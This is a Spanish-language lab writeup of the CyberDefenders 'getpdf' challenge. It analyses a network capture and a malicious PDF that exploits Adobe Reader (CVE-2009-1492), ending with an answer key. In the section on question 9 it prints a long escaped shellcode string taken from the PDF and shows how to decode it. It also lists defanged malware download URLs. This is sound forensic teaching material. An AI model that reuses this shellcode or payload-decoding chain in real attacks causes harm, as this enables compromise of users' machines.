---
layout: post
comments: false
title : Writeup | CyberDefenders | getpdf
categories: [Writeups CyberDefenders]
tags: Writeups, Writeups Español, Cyberdefenders, getpdf, Análisis de Malware, Maldocs, Análisis de Documentos Maliciosos
excerpt: "Este es una guía de cómo resolver, paso a paso, el reto getpdf de la plataforma Cyberdefenders.org"
---

# Índice

1. [Preámbulo](#pre)\\
    1.1 [Introducción](#intro)
2. [Writeup](#wu)\\
    2.1 [Pregunta 1](#p1)\\
    2.2 [Pregunta 2](#p2)\\
    2.3 [Pregunta 3](#p3)\\
    2.4 [Pregunta 4](#p4)\\
    2.5 [Pregunta 5](#p5)\\
    2.6 [Pregunta 6](#p6)\\
    2.7 [Pregunta 7](#p7)\\
    2.8 [Pregunta 8](#p8)\\
    2.9 [Pregunta 9](#p9)
3. [Preguntas y repuestas](#pyr)


# Preámbulo <a name="pre"><a>

<html>
<body>
<style>
table, th, td {
  border:1px solid black;
}
</style>
</body>
</html>

|Info|Descripción|
|----|-----------|
|Reto|getpdf|
|SHA1SUM|81b99e0094edde5de6cec7d9f5cd391d9eca3eb2|
|Autor|The Honeynet Pot|
|Tags|pdf, macro, cve, exploit| 


## Escenario

El formato PDF es el estándar, *de facto*, en el intercambio de documentos en línea. Sin embargo, esta popularidad también ha atraído a los ciberdelincuentes a la hora de propagar malware a usuarios desprevenidos. La capacidad de generar archivos pdf maliciosos para distribuir malware es una funcionalidad que se ha incorporado a muchos kits de exploits. Como los usuarios son menos precavidos a la hora de abrir archivos PDF, el archivo PDF malicioso se ha convertido en un vector de ataque bastante exitoso. El tráfico de red capturado en *lala.pcap* contiene tráfico de red relacionado con un ataque típico de archivo PDF malicioso, en el que un usuario desprevenido abre una página web comprometida, que redirige el navegador web del usuario a una URL de un archivo PDF malicioso. Cuando el complemento PDF del navegador abre el PDF, se aprovecha la versión sin parches de Adobe Acrobat Reader y, como resultado, descarga e instala silenciosamente malware en la máquina del usuario.


## Herramientas

- VM Remnux
- VM Flare
- pdfid
- pdfparser
- peepdf
- PDFStreamDumper
- pdfextract
- WireShark
- tshark
- scdbg
- NetworkMiner


## Introducción <a name="intro"></a>

Vamos a resolver el reto getpdf de la plataforma cyberdefenders.org, paso a paso, de las preguntas 1 a la 9. Todas están ya respondidas, pero sólo habrá detalles para las preguntas especificadas.

---

# WriteUp <a name="wu"> </a>

Aquí empieza lo bueno. Como dije anteriormente, el writeup paso a paso será sólo de las preguntas de la 1 a la 9.

## **1. ¿Cuántas rutas URL están involucradas en este incidente?** <a name="p1"></a>

Como primer paso, podemos explorar el archivo pcap para visualizar la información contenida. Sin embargo, para encontrar directamente las urls involucradas en el incidente, podemos usar el tshark dentro de la máquina remnux con el siguiente comando:

```
tshark -r lala.pcap -T fields -e "http.request.full_uri | sort -u"
```

- La flag -r nos ayudará a definir el fichero que queremos que el tshark lea su contenido.
- -T definirá el formato en el que se presentará la salida del comando.
- Si se introdujo en el comando la flag "-T fields", podemos agregar la flag -e para especificar los campos que se van a imprimir por pantalla.
- El sort -u es para se impriman por pantalla resultados únicos, es decir, sin repeticiones.

|No.|URL|
|---|---|
|1|httx://blog.honeynet.org.my/favicon.ico|
|2|httx://blog.honeynet.org.my/forensic_challenge|
|3|httx://blog.honeynet.org.my/forensic_challenge/|
|4|httx://blog.honeynet.org.my/forensic_challenge/fcexploit.pdf|
|5|httx://blog.honeynet.org.my/forensic_challenge/getpdf.php|
|6|httx://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe|

![getpdf1](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img1.png)

## **2. ¿Cuál es la URL que contiene el código JS?** <a name="p2"></a>

Para este paso, haremos uso del **wireshark**, abrimos el archivo pcap. Un primer paso es identificar las peticiones http que se han hecho. Para esto, la captura 12 tiene información que se puede identificar con un código JS. Usualmente, los scripts en JS tienen etiquetas "\<script\>" los cuales se pueden identificar en el índice 12:

![getpdf2](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img2.png)

- Una manera sencilla de trazar las comunicaciones entre el cliente y el servidor es mediante la función interna del wireshark "follow":

![getpdf3](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img3.png)

- Dentro de los resultados veremos texto en azul y en rojo. *Grosso modo*, lo rojo son las peticiones y lo azul las respuestas.
- La petición que dio lugar a esta respuesta es la siguiente:

![getpdf4](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img4.png)

- Allí podemos ver la dirección hacia donde se hizo la petición.

## **3. ¿Cuál es la URL oculta en el código JS?** <a name="p3"></a>

Siguiendo la secuencia de las peticiones, la inmediatamente posterior a la respuesta con el código JS apunta a un recurso php:

![getpdf5](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img5.png)

## **4. ¿Cuál es el hash MD5 del archivo PDF contenido en el paquete?** <a name="p4"></a>

Para seguir con esta pregunta, utilizaremos la herramienta Network Miner que viene pre instalada en la máquina remnux. Basta con abrir el archivo pcap en la interfaz del network miner.

![getpdf6](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img6.png)

- Al arbirse el pcap, podremos ver en la parte superior una serie de pestañas. La que nos interesa es la de "files".
- Al abrir esta pestaña, veremos que hay un archivo pdf que lleva por nombre "fcexploit.pdf".
- Al darle doble click, la herramienta nos desplegará una serie de información entre la cual viene incluido el MD5.
- Es importante señalar que, al correr el network miner, los recursos que hayan sido parte de una petición se almacenan en una ruta del sistema. Puedes abrir estos documentos si das click derecho a, por ejemplo, el pdf en cuestión y luego das click en "abrir carpeta".

## **5. ¿Cuántos objetos están contenidos dentro del archivo PDF?** <a name="p5"></a>

Para seguir con el reto, usaremos la herramienta "pdfid.py". Podemos transferir el pdf al Escritorio, por ejemplo, y desde allí correr la herramienta. Lo ideal, todo sea dicho, es que tengamos todos estos recursos en una sola carperta donde estemos almacenando toda la evidencia.

Lo que haremos será analizar el código JS embebido en el pdf de manera segura:

```
pdfid.py --disarm fcexploit.pdf
```
Lo que veremos será lo siguiente:

![getpdf7](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img7.png)

- Entre otra información, se puede identificar que hay, dentro del pdf, 19 objetos.

## **6. ¿Cuántos esquemas de filtrado se utilizan para los flujos de objetos?** <a name="p6"></a>

En este paso usaremos la herramienta "pdf-parser.py" que vamos correr sobre el documento "fcexploit.pdf":

```
pdf-paser.py --search filter fcexploit.pdf
```
Lo que vamos a obtener tras ejecutar este comando será una serie de cadenas de caracteres donde podremos identifcar la palabra "filter": eso es lo que estamos buscando. Podemos contar el número de veces que aparece esta cadena y verificar que son **4**, o podemos "pipear" el resultado por un "grep Filter" y constatar que son, efectivamente 4.

![getpdf8](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img8.png)

## **7. ¿Cuál es el número del 'object stream' que podrían contener código JS malicioso?** <a name="p7"></a>

Aquí primero tendremos que explorar el contenido de nuestro archivo pdf con la herramienta "peepdf" sobre el mismo archivo pdf:

```
peepdf -f fcexploit.pdf
```
Lo que nos arroja por pantalla esta herramienta es interesante. Lo primero de todo es que ya nos da la respuesta que queremos: de los 18 objetos encontrados embedidos en el archivo, **5** son los que contienen código javascript. 

![getpdf9](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img9.png)

Por otra parte, también nos señala cuáles de los objetos encontrados en el pdf son sospechosos. 

- Sobre el que tenemos más información es el señalado como "CVE-2009-1492" el cual, en una rápida búsqueda en Google, podemos encontrar la siguiente descripción sobre esta vulnerabilidad:

> "El método getAnnots Doc de la API JavaScript de Adobe Reader y Acrobat 9.1, 8.1.4, 7.1.1 y anteriores permite a atacantes remotos provocar una denegación de servicio (corrupción de memoria) o ejecutar código arbitrario a través de un archivo PDF que contenga una anotación y tenga una entrada OpenAction con código JavaScript que llame a este método con argumentos enteros manipulados"[^1].

## **8. Analizando el archivo PDF. ¿Qué 'object-streams' contiene el código JS responsable de ejecutar la shellcode? El código JS está dividido en dos streams. Formato: dos números separados por ','. Pon los números en orden ascendiente.** <a name="p8"></a>

La segunda parte concierne a esta pregunta, una vez ya sabemos que hay 5 objetos con código JS ahora hay que extraerlos con la herramienta "pdfextract", la cual funciona de manera muy directa:

```
pdfextract fcexploit.pdf
```

![getpdf10](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img10.png)

- El resultado de la extracción nos indica que hubo 5 extracciones que se movieron a la carpeta que especifica.

- Para averiguar cuál de ellos es el que tiene el código malicioso habrá que analizar su contenido. Si ingresamos al directorio donde se encuentran los archivos extraidos veremos lo siguiente:

![getpdf11](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img11.png)

Podríamos imprimir por pantalla el contenido de los ficheros pero es un despropósito; están ofuscados. Sabiendo de antemanto que el "stream_7" contiene código malicioso es imposible leerlo así de primeras:

![getpdf12](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img12.png)

- No podemos ir a lo Rambo a tratar de leer este tipo de ficheros así que necesitaremos otras herramientas para seguir con la investigación.

Esta es la parte dura de esta investigación. Para saber cuáles son los códigos maliciosos de los 5 posibles, primero debemos entender qué es lo que está haciendo el script que hemos encontrado. Para ello puse bello el script en la web beautifier[^2] y encontramos lo siguiente:

![getpdf13](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img13.png)

- Hay dos funciones definidas que tienen la cadena "Annot" en común, ésta la vamos a buscar dentro de los 5 streams que hemos dumpeado.
- Por otra parte, este código se encuentra en el directorio "script" que "pdfextract" ha creado para nosotros:

![getpdf14](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img14.png)

- El siguiente paso es regresar a nuestra herramienta "pdf-parser" y buscar la cadena "Annot" sobre nuestro pdf infectado:

```
pdf-parser.py -a fcexploit.pdf | grep Annot
```

![getpdf15](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img15.png)

- La herramienta nos está diciendo cuáles son los objetos que contienen la cadena que estamos buscando:  6, 8 y 24.
- Podemos volver a correr el pdf-parser sobre estos objetos para ver qué hay dentro:

```
pdf-parser.py -o 6 fcexploit.pdf
```
- Tenemos que hacer lo mismo para los tres objetos (6, 8 y 24):

![getpdf16](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img16.png)
![getpdf17](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img17.png)

- Observando los resultados para los objetos 6 y 8 podemos ver que cada uno de ellos referencia otro objeto, el 7 y el 9, respectivamente.

## **9. El código JS responsable de ejecutar el exploit contiene shellcodes que sueltan archivos ejecutables maliciosos. ¿Cuál es la ruta completa de los archivos ejecutables maliciosos después de que el malware los suelte en la máquina de la víctima?** <a name="p9"></a>

Esta es la tercera parte del análisis y la más densa. Aquí tendremos que hacer un poco de ingeniería inversa del código malicioso para responder a esta pregunta. Retomando lo que llevamos, ahora sabemos que las streams que contiene el código malicioso responsable de ejecutar la shell están en los objetos 7 y 9. Lo que toca ahora es extraer el shell code de estos objetos.

Aquí vamos a usar dos herramientas "cyberchef"[^3] y "peepdf". Primero usaremos la "peepdf" para crear una sesión interactiva con el pdf infectado con la finalidad de observar el comportamiento del archivo:

```
peepdf -fli fcexploit.pdf
```
![getpdf18](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img18.png)

- Recordemos que nos interesan los objetos 7 y 9. Entonces, para imprimir por pantalla el contenido de estos objetos basta con poner el comando

```
object 7/9
```

- Veremos un código enorme que no vale ni la pena mostrar en una captura. Lo que sí nos interesa es recordar que en el objeto 5 estaba el script o rutina que nos va a ayudar a entender el proceso de codificación o, para nuestros propósitos, la manera de decodificar el payload malicioso. Para este paso tendremos que usar la herramienta "pdf stream dumper" que no viene instalada en la máquina remnux pero sí dentro de la MV Flare, así que para allá vamos.
- Lo primero es abrir el "pdf stream dumper" en la máquina Flare e importar el pdf malicioso (fcexploit.pdf). Si nos vamos al objetos 5 veremos de nuevo el script que estamos buscando:

![getpdf19](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img19.png)

- Lo bueno de esta herramienta es que podemos ejecutar el javascript de manera segura con tan sólo dar click en la pestaña de "Javascript_UI". Luego hay que darle a "Run" y esperar a que se ejecute: si sale algún error, tú sólo dale a "Run" hasta que el error desaparezca. Lo que veremos será el JS de una manera más legible:

![getpdf20](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img20.png)

- Lo que vemos es que el script hace cuatro reemplazos de cadenas (1-4). Así que nuestra tarea ahora es "cocinarnos" nuestro propio script. Es decir, nos iremos al Cyberchef a pedirle que reemplace lo que hemos encontrado en el contenido de los objetos 7 y 9 que, recordemos, son donde se encuentra la shell code maliciosa.
- Lo que hice fue un poco tortuoso pero básicamente copie y pegue todo el codigo (que es enorme) en un txt y luego un poco más de copy-paste en la web del chef. El mismo procedimiento para ambos objetos.

![getpdf21](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img21.png)

- Lo que sigue es hacer los reemplazos: en la parte de "Operations" elegimos la opción de "Find / Replace" y allí vamos a meter los 4 reemplazos que encontramos en el script. Recordemos que son los siguiente:

|Find|Replace|
|-----|-------|
|X_17844743X_170987743|%|
|89af50d|%|
|\\n|""|
|\\r|""|
|unescape||

- Es importante señalar que la última parte del código tiene un "unescape" así que meteremos una transformación más al cyberchef que es la de "From Hex" y esto debería darnos lo que estamos buscando.

- Si todo sale bien, deberían tener en el cyberchef algo como esto:

![getpdf22](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img22.png)

- En la sección de "Output" tendremos el shell code de los objetos 7 y 9.
- El shell code completo está dividido así que tendremos que entender cómo funciona por partes. Regresaremos a nuestra sesión interactiva del "peepdf" y copiar y pegar parte por parte el código.
- En la sesión de peepdf metemos lo siguiente. Toda esa cadena de caracteres está dentro de la primera parte del shell code:

```
set var ""%uc931%u64b1%ub6bf%u558b%ud976%ud9cd%u2474%u58f4%ue883%u31fc%u0d78%u7803%ue20d%u6043%u2c45%u44e1%ub6af%u964c%ub72e%ued9a%u55a9%u1a18%u71cc%u2237%u7e30%u91b7%u1856%ue9ae%u2394%u7479%ucdff%u5e6b%ufc95%ue562%u12a2%u77ad%u53d8%u925f%u4178%ue5b2%ufc62%uf826%ub883%u9e2c%u6c59%uf5dd%u5d2a%uc113%uc7c1%ub031%u6cf7%ua2b6%u1838%u2007%u1d29%ua0b1%u0314%uaee1%ufbd8%u96df%ua80b%uc7cd%uca91%ubfab%u7091%uea13%u7a32%u7bb1%u5ba0%ue130%u3b9f%u8d42%ue4ba%u28a0%u4e20%u29d6%u0147%uf2cc%ucff0%uffb9%u2f62%uc948%u2904%ud333%ude69%u2b88%u10f3%u776b%uedee%uef80%u9fcf%u89c2%uc649%uf510%u36e3%u10fb%ud153%u40ef%u4d82%u41f6%ue4ae%u5cb1%uf58a%uaa78%u3472%u750f%u52e6%u712a%u9faf%u5fea%uc24a%u9cf3%u64f2%u0559%u5ecc%u7957%u0607%ue3a9%u828a%u26fc%uc2cc%u7f97%u1577%u2a0a%u9c21%u73c8%ube3e%u4838%uf571%u04de%uca4d%ue02c%u6126%u4c09%ucab8%u16cf%ueb5c%u3af3%uf869%u3ffd%u02b2%u2bfc%u17bf%u3214%u149e%u8f05%u0fff%uec38%u0df4%ue632%u5709%u0f5f%u481a%u6947%u7913%u5680%u864d%ufe94%u9652%uec98%ua8a6%u13b3%ub6c0%u39da%ub1c7%u1421%ub9d8%u6f32%udef2%u091c%uf4e9%ude69%ufd04%ud308%ud722%u1af7%u2f5a%u15f2%u2d5b%u2f31%u3e43%u2c3c%u26a4%ub9d6%u2921%u6d1c%uabe5%u1e0c%u059e%u8fa4%u3f0e%u3e4d%ucbaa%ud183%u5346%u40f5%ub4de%uf46f%uae52%u7901%u53fa%u1e82%uf294%u8d50%u9b01%u28cf%u50e5%ud262%ue195%u661d%u2003%ufeb8%ubcae"
```

![getpdf23](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img23.png)

- Lo siguiente que tenemos que hacer es "unescapear" el contenido de nuestra variable. En la sesión metemos:

```
js_unescape variable var $>raw_var
```
 
- Metimos el contenido del código en la variable "raw_var" y lo que haremos después es hacerle un test para que se ejecute esta parte del código:

```
sctest variable raw_var
```

- Y tendremos que ver lo que ocurre con esta parte del código. Entre otras cosas, tenemos la ruta donde se almacena un ejecutable llamado "3malware.exe":

![getpdf24](https://github.com/Sokratica/sokratica/blob/master/assets/img/getpdf/img24.png)

**El resto de preguntas quedan de tarea para el lector. De cualquier manera ya tienes las respuestas a todas las preguntas.**

---

# Preguntas y respuestas <a name="pyr"></a>

1. ¿Cuántas rutas URL están involucradas en este incidente? **R: 6**

2. ¿Cuál es la URL que contiene el código JS? **R: httx://blog.honeynet.org.my/forensic_challenge/**

3. ¿Cuál es la URL oculta en el código JS? **R: httx://blog.honeynet.org.my/forensic_challenge/getpdf.php**

4. ¿Cuál es el hash MD5 del archivo PDF contenido en el paquete? **R: 659cf4c6baa87b082227540047538c2a**

5. ¿Cuántos objetos están contenidos dentro del archivo PDF? **R: 19**

6. ¿Cuántos esquemas de filtrado se utilizan para los flujos de objetos? **R: 4**

7. ¿Cuál es el número del 'object stream' que podrían contener código JS malicioso? **R: 5**

8. Analizando el archivo PDF. ¿Qué 'object-streams' contiene el código JS responsable de ejecutar la shellcode? El código JS está dividido en dos streams. Formato: dos números separados por ','. Pon los números en orden ascendiente. **R: 7, 9**

9. El código JS responsable de ejecutar el exploit contiene shellcodes que sueltan archivos ejecutables maliciosos. ¿Cuál es la ruta completa de los archivos ejecutables maliciosos después de que el malware los suelte en la máquina de la víctima?
**R: cx:\WINDOWS\system32\a.exe**

10. El archivo PDF contiene otro exploit relacionado con CVE-2010-0188. ¿Cuál es la URL del ejecutable malicioso que suelta el shellcode asociado a este exploit? **R: httx://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe**

11. ¿Cuántos CVE's están incluidos en el archivo PDF? **R: 5**

---
---
**Referencias**

[^1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1492
[^2]: https://beautifier.io/
[^3]: https://cyberchef.org/ 

